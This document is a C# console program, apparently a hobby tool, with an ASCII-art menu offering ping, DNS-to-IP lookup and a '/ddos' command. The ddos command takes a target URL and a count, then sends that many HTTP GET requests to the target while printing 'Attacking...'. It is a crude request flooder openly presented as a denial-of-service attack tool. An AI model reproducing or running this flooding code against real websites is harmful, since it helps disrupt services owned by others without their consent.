using System;
using System.Net.NetworkInformation;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
namespace Console_Net
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Console.Net";
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.ForegroundColor = ConsoleColor.White;
            Console.SetWindowPosition(0,0);
            Console.Clear();

            //vars

            string COMMANDS;
            //string[] COMMANDS_LIST = {"/help","/ping","/ddos","/getip"};

            Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |          Welcome to Console_Net         |    |
           |   |               Type /start               |    |
           |   |          to start the program           |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
            Console.Write(">:");
            COMMANDS = Console.ReadLine();


            if (COMMANDS == "/start") 
            {
                Console.Clear();
                Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |          Welcome to Console_Net         |    |
           |   |               Type /help                |    |
           |   |          for more information           |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                Console.Write(">:");
                COMMANDS = Console.ReadLine();

                CASE: switch (COMMANDS) 
                {
                    case "/help":
                        Console.Clear();
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |         #### The Commands are ####      |    |
           |   |         1-/help                         |    |
           |   |         2-/ping                         |    |
           |   |         3-/ddos                         |    |
           |   |         4-/getip                        |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        COMMANDS = Console.ReadLine();
                        goto CASE;

                    case "/ping":
                        Console.Clear();
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |            Enter URL to ping            |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        string URL = Console.ReadLine();
                        PING(URL);
                        Console.Clear();
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |         #### The Commands are ####      |    |
           |   |         1-/help                         |    |
           |   |         2-/ping                         |    |
           |   |         3-/ddos                         |    |
           |   |         4-/getip                        |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        COMMANDS = Console.ReadLine();
                        goto CASE;

                    case "/getip":
                        Console.Clear();
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |           Enter URL to get the ip       |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        string LINK = Console.ReadLine();
                        GET_IP(LINK);
                        Thread.Sleep(2500);
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |         #### The Commands are ####      |    |
           |   |         1-/help                         |    |
           |   |         2-/ping                         |    |
           |   |         3-/ddos                         |    |
           |   |         4-/getip                        |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        COMMANDS = Console.ReadLine();
                        goto CASE;

                    case "/ddos":
                        Console.Clear();
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |           Enter URL to get the ddos     |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        string LINK_ = Console.ReadLine();

                        Console.Clear();
                        Console.WriteLine(@"             
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |        Enter the number of attacks      |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/");
                        Console.Write(">:");
                        int TIME = Convert.ToInt32(Console.ReadLine());

                        DDOS(LINK_,TIME);

                        Console.Clear(); 

                        goto CASE;
                }
            }
            else 
            {
                Environment.Exit(0);
            }

            Console.ReadKey(true);
        }
        static void PING(string LINK) 
        {
            string url = LINK;

            var ping = new Ping();

            PingReply reply = ping.Send(url);

            if (reply.Status == IPStatus.Success)
            {
                var msg = @$"Status: {reply.Status}
                IP Address:{reply.Address}
                Time:{reply.RoundtripTime}ms";
                Console.WriteLine(msg);
            }
            else
            {
                Console.WriteLine(reply.Status);
            }
            Thread.Sleep(5000);
        }
        static void GET_IP(string LINK) 
        {
            Console.Clear();
            var url = LINK;

            string[] back = { "BACK" };

            IPHostEntry host = Dns.GetHostEntry(url);
            var addresses = host.AddressList;

            Console.WriteLine("The IP is");
            foreach (var address in addresses)
            {
                Console.WriteLine($"{address}");
            }

            Thread.Sleep(4250);
            Console.Clear();

            Main(back);
        }
        static void DDOS(string LINK,int TIME) 
        {
            var url = LINK;
            var time = TIME;


            for (var i = 0; i < time; i++) 
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                using var response = (HttpWebResponse)request.GetResponse();
                using var stream = response.GetResponseStream();
                using var reader = new StreamReader(stream);

                var data = reader.ReadToEnd();
                Console.WriteLine(data);

                Console.WriteLine("Attacking..."+"["+i+"]");
            }

            Console.Clear();
            Console.WriteLine("DONE");
        }
    }
}
